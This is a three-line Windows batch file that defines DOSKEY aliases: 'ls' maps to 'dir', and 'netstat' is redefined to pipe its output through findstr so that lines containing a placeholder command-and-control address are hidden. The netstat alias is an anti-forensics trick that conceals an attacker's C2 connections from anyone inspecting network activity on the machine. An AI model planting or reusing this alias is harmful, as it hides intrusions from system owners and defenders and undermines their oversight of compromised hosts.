@echo off
DOSKEY ls=dir
DOSKEY netstat=netstat $* ^| findstr /v "<IP of C2>"
